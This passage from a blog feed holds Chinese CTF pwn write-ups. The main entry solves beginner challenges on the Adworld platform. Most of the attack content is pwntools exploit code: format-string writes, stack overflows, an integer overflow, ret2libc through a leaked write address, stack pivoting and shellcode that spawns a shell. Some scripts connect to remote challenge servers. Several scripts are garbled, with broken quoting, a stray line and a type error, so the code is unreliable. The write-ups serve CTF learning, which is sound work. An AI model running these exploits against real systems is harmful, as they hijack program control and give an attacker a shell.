接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> <span class="hljs-comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span><br>payload += p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>write_addr = u32(p.recv(<span class="hljs-number">4</span>)) <span class="hljs-comment">#接收泄露的地址</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>, write_addr) <span class="hljs-comment">#利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span><br>libc_base = write_addr - libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<span class="hljs-comment">#获取libc的基地址</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span><br><span class="hljs-comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)<br>payload += p32(binsh_addr)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> + p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn: 攻防世界新手区pwn题解</title>
    <link href="/2021-07/pwn-ctf-pwn2/"/>
    <url>/2021-07/pwn-ctf-pwn2/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn-攻防世界新手区pwn题解"><a href="#pwn-攻防世界新手区pwn题解" class="headerlink" title="pwn: 攻防世界新手区pwn题解"></a>pwn: 攻防世界新手区pwn题解</h1><p>Adworld的新手区水题记录。</p><h2 id="1-get-shell"><a href="#1-get-shell" class="headerlink" title="1 get shell"></a>1 get shell</h2><p>没什么好说的。直接remote或者nc连上去就可以了。</p><h2 id="2-CGfsb"><a href="#2-CGfsb" class="headerlink" title="2 CGfsb"></a>2 CGfsb</h2><h3 id="2-1-checksec"><a href="#2-1-checksec" class="headerlink" title="2.1 checksec"></a>2.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/NLtTXI1s2VZxOgY.png" alt="1"></p><h3 id="2-2-找漏洞"><a href="#2-2-找漏洞" class="headerlink" title="2.2 找漏洞"></a>2.2 找漏洞</h3><p>IDA打开main函数。</p><p><img src="https://i.loli.net/2021/07/19/gftCLErnSAbqV7N.png" alt="2"></p><p>可以看出<code>printf(&amp;s);</code>是明显的格式化字符串漏洞。</p><p>IDA mov 从右往左.</p><p>pwnme的地址：0x804A068<img src="https://i.loli.net/2021/07/19/B41GJedNSzW7x2c.png" alt="image-20210716120017221" style="zoom:67%;" /> <strong>看清楚, 压入的是format字符串的地址!!</strong>.</p><p><img src="https://i.loli.net/2021/07/19/ylWdNF7t21mcRsY.png" alt="3"></p><h3 id="2-3-脚本"><a href="#2-3-脚本" class="headerlink" title="2.3 脚本"></a>2.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#CGfsb.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = p32(<span class="hljs-number">0x804A068</span>) + <span class="hljs-string">&#x27;AAAA%10$n&#x27;</span> <span class="hljs-comment">#这个10是自己试出来的</span><br><span class="hljs-comment">#payload = &#x27;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./CGfsb&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;please:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="3-when-did-you-born"><a href="#3-when-did-you-born" class="headerlink" title="3 when did you born"></a>3 when did you born</h2><h3 id="3-1-checksec"><a href="#3-1-checksec" class="headerlink" title="3.1 checksec"></a>3.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/m75TCOwzUhu4naY.png" alt="4"></p><h3 id="3-2-找漏洞"><a href="#3-2-找漏洞" class="headerlink" title="3.2 找漏洞"></a>3.2 找漏洞</h3><p>IDA64打开。</p><img src="https://i.loli.net/2021/07/19/kiDx1ElBSs3a9QP.png" alt="5" style="zoom: 77%;" /><p>很明显，第一个输入的数字不能是1926（Excited!)</p><p>然后通过gets把他变成1926（Naive!）</p><h3 id="3-3-脚本"><a href="#3-3-脚本" class="headerlink" title="3.3 脚本"></a>3.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#when_did_you_born.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span> + p32(<span class="hljs-number">1926</span>)<br>r = process(<span class="hljs-string">&#x27;./when_did_you_born&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Birth?\n&#x27;</span>,<span class="hljs-string">&#x27;1925&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Name?\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="4-hello-pwn"><a href="#4-hello-pwn" class="headerlink" title="4 hello pwn"></a>4 hello pwn</h2><h3 id="4-1-checksec"><a href="#4-1-checksec" class="headerlink" title="4.1 checksec"></a>4.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/xyLCbiM2sQ6OqnZ.png" alt="6"></p><h3 id="4-2-找漏洞"><a href="#4-2-找漏洞" class="headerlink" title="4.2 找漏洞"></a>4.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/F1EKL38tD4lCkjm.png" alt="7"></p><p>逻辑很简单，在<code>unk_601068</code>读入一个值，让<code>dword_60106c</code>变为<code>1853186401</code>即可。</p><h3 id="4-3-脚本"><a href="#4-3-脚本" class="headerlink" title="4.3 脚本"></a>4.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#hello_pen.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(<span class="hljs-number">1853186401</span>)<span class="hljs-comment">#-&gt;转换成16进制就是八位数了, 可以p32</span><br><br>r = process(<span class="hljs-string">&#x27;./hello_pwn&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;bof\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="5-level0"><a href="#5-level0" class="headerlink" title="5 level0"></a>5 level0</h2><h3 id="5-1-checksec"><a href="#5-1-checksec" class="headerlink" title="5.1 checksec"></a>5.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/Fiunr2gLte3zOqa.png" alt="8"></p><h3 id="5-2-找漏洞"><a href="#5-2-找漏洞" class="headerlink" title="5.2 找漏洞"></a>5.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/ZqmXBSlNDhP9MVu.png" alt="9" style="zoom:67%;" /><p>这里好像有个什么东西嘛…</p><h3 id="5-3-脚本"><a href="#5-3-脚本" class="headerlink" title="5.3 脚本"></a>5.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#level0.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x400596</span>)<span class="hljs-comment">#callsystem的地址, 简单的read栈溢出</span><br><span class="hljs-comment">#r = process(&#x27;./level0&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">45579</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;World\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="6-level2"><a href="#6-level2" class="headerlink" title="6 level2"></a>6 level2</h2><h3 id="6-1-checksec"><a href="#6-1-checksec" class="headerlink" title="6.1 checksec"></a>6.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/UkONFSAoqVgPyjB.png" alt="10"></p><h3 id="6-2-找漏洞"><a href="#6-2-找漏洞" class="headerlink" title="6.2 找漏洞"></a>6.2 找漏洞</h3><p>system函数！</p><img src="https://i.loli.net/2021/07/19/YKBlwLMFsot4xNy.png" alt="11" style="zoom:80%;" /><p>/bin/sh!</p><img src="https://i.loli.net/2021/07/19/dvgGrQhzkw87ZBP.png" alt="12" style="zoom:80%;" /><p>溢出地址0x8c，返回地址填plt的system地址，参数填/bin/sh的地址。奥利给！</p><p>ps. 会了才知道为什么洛神会这么简洁…..|ू･ω･` )</p><h3 id="6-3-脚本"><a href="#6-3-脚本" class="headerlink" title="6.3 脚本"></a>6.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span> + p32(<span class="hljs-number">0x8048320</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>+ p32(<span class="hljs-number">0x804A024</span>) <span class="hljs-comment">#空4字节是system函数的返回地址</span><br><span class="hljs-comment">#r = remote(&#x27;111.198.29.45&#x27;,49960)</span><br>r = process(<span class="hljs-string">&quot;./level2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Input:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="7-guess-num"><a href="#7-guess-num" class="headerlink" title="7 guess num"></a>7 guess num</h2><h3 id="7-1-checksec"><a href="#7-1-checksec" class="headerlink" title="7.1 checksec"></a>7.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/uN6HcDVqr28J1ml.png" alt="13"></p><h3 id="7-2-找漏洞"><a href="#7-2-找漏洞" class="headerlink" title="7.2 找漏洞"></a>7.2 找漏洞</h3><p>猜数字，先生成了个随机数，然后猜9次。猜对了给flag。</p><img src="https://i.loli.net/2021/07/19/SNmUETKHkDqcroa.png" alt="14" style="zoom:80%;" /><p>很显然，只要通过get函数把随机种子改成自己想要的就行了。</p><p>先写个脚本看看随机种子是0的情况：</p><img src="https://i.loli.net/2021/07/19/YSh74wOVLI3KpTU.png" alt="15" style="zoom:80%;" /><p>写脚本吧。字符串长度为0x30-0x10=0x20。偏移值后面加个0就行。</p><h3 id="7-3-脚本"><a href="#7-3-脚本" class="headerlink" title="7.3 脚本"></a>7.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>l = [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>* <span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0</span>)<br>r = process(<span class="hljs-string">&#x27;./guess_num&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,payload)<br><span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> l:<br>r.sendlineafter(<span class="hljs-string">&#x27;number:&#x27;</span>,<span class="hljs-built_in">str</span>(each))<span class="hljs-comment">#sendlineafter的参数就是字符串</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="8-int-overflow"><a href="#8-int-overflow" class="headerlink" title="8 int overflow"></a>8 int overflow</h2><h3 id="8-1-checksec"><a href="#8-1-checksec" class="headerlink" title="8.1 checksec"></a>8.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/N6oXuSjhaAGOz4x.png" alt="16"></p><h3 id="8-2-找漏洞"><a href="#8-2-找漏洞" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/xEalQB5bc1ovGXy.png" alt="17" style="zoom:80%;" /><p>先进这个函数。</p><p><img src="https://i.loli.net/2021/07/19/n82u3GmtfbsLcjk.png" alt="18"></p><p>显而易见嘛。(?)</p><p>再进check_passwd()</p><p><img src="https://i.loli.net/2021/07/19/MVbGalDqcB3miJp.png" alt="image-20210716122047227" style="zoom: 80%;" />可以看到__int8, 只有0-255, 而且有要求密码长4-8, 所以可以整数溢出的办法, buf长512也够了</p><h3 id="8-3-脚本"><a href="#8-3-脚本" class="headerlink" title="8.3 脚本"></a>8.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>r = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">50645</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x0804868B</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">232</span><br>r.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">&quot;f**k&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;passwd:\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="9-cgpwn2"><a href="#9-cgpwn2" class="headerlink" title="9 cgpwn2"></a>9 cgpwn2</h2><h3 id="9-1-checksec"><a href="#9-1-checksec" class="headerlink" title="9.1 checksec"></a>9.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/dOLQ8A5XaRMDF47.png" alt="20"></p><h3 id="8-2-找漏洞-1"><a href="#8-2-找漏洞-1" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/KJQpnbUuq5aoPOl.png" alt="21"></p><p>溢出点肯定就是gets函数啦。偏移值0x2A。<br>但是我们需要自己构造system函数的参数，只要把name的值改成那个值就行了。</p><h3 id="9-3-脚本"><a href="#9-3-脚本" class="headerlink" title="9.3 脚本"></a>9.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x2A</span>(<span class="hljs-string">&#x27;捏妈的,0x26+0x4能给我算成0x30来?&#x27;</span>) + p32(<span class="hljs-number">0x8048420</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>-&gt;sys返回地址<span class="hljs-string">&#x27; + p32(0x804A080)&#x27;</span>name的地址<span class="hljs-string">&#x27;</span><br><span class="hljs-string">r = process(&#x27;</span>./cgpwn2<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>name\n<span class="hljs-string">&#x27;,&#x27;</span>/<span class="hljs-built_in">bin</span>/sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>here:\n<span class="hljs-string">&#x27;,payload)</span><br><span class="hljs-string">r.interactive()</span><br></code></pre></td></tr></table></figure><h2 id="10-string"><a href="#10-string" class="headerlink" title="10 string"></a>10 string</h2><h3 id="10-1-checksec"><a href="#10-1-checksec" class="headerlink" title="10.1 checksec"></a>10.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/f6NWvTAL2tYuKkr.png" alt="22"></p><h3 id="10-2-找漏洞"><a href="#10-2-找漏洞" class="headerlink" title="10.2 找漏洞"></a>10.2 找漏洞</h3><p>代码好长啊。</p><img src="https://i.loli.net/2021/07/19/32uH7CzocNe4bKE.png" alt="23" style="zoom:80%;" /><p>看看func1。</p><img src="https://i.loli.net/2021/07/19/JI9wTKFP6li1gZV.png" alt="24" style="zoom: 80%;" /><p>func2。</p><img src="https://i.loli.net/2021/07/19/AscTUzQ9x1KXBR8.png" alt="25" style="zoom:80%;" /><p>没有溢出点。func3。</p><img src="https://i.loli.net/2021/07/19/3DxVSQvWNoB58ea.png" alt="26" style="zoom:80%;" /><p>好啦，溢出点。</p><p><img src="https://i.loli.net/2021/07/19/vAengmcpkH6dqK4.png" alt="27"></p><p>很明显，让a1数组的第0位和第1位相等（就是85和68）。</p><p>后面那个mmap是内存映射，意思就是填入一个机器码使得直接执行。</p><h3 id="10-3-脚本"><a href="#10-3-脚本" class="headerlink" title="10.3 脚本"></a>10.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;%68c%7$n&#x27;</span><span class="hljs-comment"># b&#x27;a&#x27;*85 + &#x27;%7$n&#x27;也是可以的</span><br>r = process(<span class="hljs-string">&#x27;./string&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;secret[1] is &#x27;</span>)<br>a = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x&#x27;</span>+r.recvline(),base=<span class="hljs-number">16</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name be:\n&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;up?:\n&#x27;</span>,<span class="hljs-string">&#x27;east&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;leave(0)?:\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;address&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(a))<br>r.sendlineafter(<span class="hljs-string">&#x27;wish is:\n&#x27;</span>,payload)<br>r.sendlineafter(<span class="hljs-string">&#x27;SPELL\n&#x27;</span>,asm(shellcraft.amd64.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))<br><span class="hljs-comment">#当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。</span><br><span class="hljs-comment">#获得执行system(“/bin/sh”)汇编代码所对应的机器码： asm(shellcraft.sh()) 。注意要指明arch和os。arch有</span><br><span class="hljs-comment">#i386(x86)和amd64(x64)。攻防世界的题解区有人说这个函数失效，其实是因为他没指明环境。不同环境下的汇编代</span><br><span class="hljs-comment">#码是不同的。</span><br>r.interactive()<br><br><span class="hljs-comment">#AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-</span><br></code></pre></td></tr></table></figure><h2 id="11-level3"><a href="#11-level3" class="headerlink" title="11 level3"></a>11 level3</h2><h3 id="11-1-checksec"><a href="#11-1-checksec" class="headerlink" title="11.1 checksec"></a>11.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/kwIAFZPTb5BuMfV.png" alt="28"></p><h3 id="11-2-找漏洞"><a href="#11-2-找漏洞" class="headerlink" title="11.2 找漏洞"></a>11.2 找漏洞</h3><p>开IDA看看，看到有一个read的栈溢出。</p><p><img src="https://i.loli.net/2021/07/19/4SCUlP8QLGINi7k.png" alt="29"></p><p>只有write和read函数，那只能通过泄露libc的基址来调用<code>system(&#39;/bin/sh&#39;)</code>了。</p><p>我们可以知道的有：write函数的plt表位置和got表位置。由于在read函数之前已经调用过write函数了，即已经完成了延迟绑定，那么got表中已经记录了write的地址，由于libc的函数偏移值是固定的，则可以获得libc的基址，并得到system函数的实际地址。</p><h3 id="11-3-脚本"><a href="#11-3-脚本" class="headerlink" title="11.3 脚本"></a>11.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>aaaa<br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>DEBUG = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> DEBUG == <span class="hljs-number">1</span>:<br>p = process(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>,<span class="hljs-number">56008</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(write_plt)  + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#从这里跳转到write函数中,默认当前栈顶就是返回地址,下面的依次是参数1-n(先压参数再返回地址)</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>p.sendline(payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<span class="hljs-comment">#unpack() 这里是write函数输出的got</span><br><br><span class="hljs-comment">#print(hex(write_addr))</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<span class="hljs-comment">#重新进入main函数</span><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = (write_addr - write_libc)<span class="hljs-string">&#x27;&#x27;&#x27;这玩意儿是基址&#x27;&#x27;&#x27;</span> + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = (write_addr - write_libc) + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr) <br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;111.200.241.244&#x27;</span>, <span class="hljs-number">63933</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = write_addr - write_libc + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh_addr = write_addr - write_libc + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(sys_addr) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + sh_addr<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn题:格式化输出字符串漏洞</title>
    <link href="/2021-07/pwn-ctf-pwn1/"/>
    <url>/2021-07/pwn-ctf-pwn1/</url>
    
